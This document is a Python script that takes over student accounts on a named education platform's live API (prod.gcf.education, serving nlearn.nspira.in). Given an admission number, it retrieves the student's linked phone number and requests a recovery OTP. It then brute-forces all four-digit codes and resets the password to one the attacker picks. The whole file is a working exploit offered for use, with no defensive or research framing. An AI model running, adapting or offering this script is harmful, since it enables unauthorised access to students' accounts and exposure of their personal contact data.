import hashlib, json, os, requests
from math import floor

adm_no = str(input("Enter Admission Number: "))
new_pass = str(input("Enter New Password: "))

headers = {
    "authority": "prod.gcf.education",
    "accept": "application/json",
    "accept-language": "en-US,en;q=0.9",
    "admissionnumber": "null",
    "authorization": "Bearer null",
    "origin": "https://nlearn.nspira.in",
    "platform": "web",
    "referer": "https://nlearn.nspira.in/",
    "sec-ch-ua": '".Not/A)Brand";v="65", "Firefox";v="65", "Mozilla";v="5"',
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": '"Linux"',
    "sec-fetch-dest": "empty",
    "sec-fetch-mode": "cors",
    "sec-fetch-site": "cross-site",
    "source": "nlearn",
    "user-agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:65.0) Gecko/20100101 Firefox/65.0",
    "webversioncode": "9",
}

r = requests.get(
    "https://prod.gcf.education/auth/v1/mobile-and-email-list",
    params={"admission_number": adm_no},
    headers=headers,
)
if "This admission number doesn't exist" in r.text:
    print("\n\nAdmission Number Not Found!\n\n")
    os.system("pause")
    exit()
phone_no = json.loads(r.content)["data"]["mobile_number_list"][0]["value"]
print("\n\nFound Phone Number: ", phone_no)

r = requests.post(
    "https://prod.gcf.education/auth/v1/recover-password-via-mobile",
    headers=headers,
    json={
        "admission_number": adm_no,
        "option": phone_no,
        "mobile_number_type": "primary",
    },
)
hash = json.loads(r.content)["data"]["hash"]
print("\nReceived Account Hash: ", hash)

pass_hash = str(hashlib.md5(new_pass.encode()).hexdigest())
print("\nGenerated Password Hash: ", pass_hash)

print("\n\nBruteforcing OTP this may take a while...\n")
width = 60
i = 0
while i < 10000:
    progress = float(i) / float(10000)
    numberOfBars = int(floor(progress * float(width)))
    numberOfTicks = width - numberOfBars
    bars = "▓" * numberOfBars
    ticks = "░" * numberOfTicks
    percentage = int(floor(progress * 100))
    print(f"[{bars}{ticks}] {percentage}%", end="\r")
    r = requests.post(
        "https://prod.gcf.education/auth/v1/verify-otp",
        headers=headers,
        json={"admission_number": adm_no, "hash": hash, "otp": str(i).zfill(4)},
    )
    if r.status_code == 200:
        if "You have entered wrong OTP" not in r.text:
            print(" " * 100 + f"\nSuccessfully Verified OTP - {str(i).zfill(4)}")
            r = requests.post(
                "https://prod.gcf.education/auth/v1/reset-password",
                headers=headers,
                json={
                    "password": pass_hash,
                    "confirm_password": pass_hash,
                    "hash": hash,
                    "admission_number": adm_no,
                    "plaintextPassword": new_pass,
                },
            )
            if (
                r.status_code == 200
                and "You haven't verified your otp yet" not in r.text
            ):
                print("\n\nSuccessfully Changed Password!")
                print(
                    "\n\nYou can login with\nAdmission Number: ",
                    adm_no,
                    " \nNew Password: ",
                    new_pass,
                    "\n\n",
                )
                break
            else:
                print("\nFailed to Change Password!")
                break
    i += 1

os.system("pause")
exit()
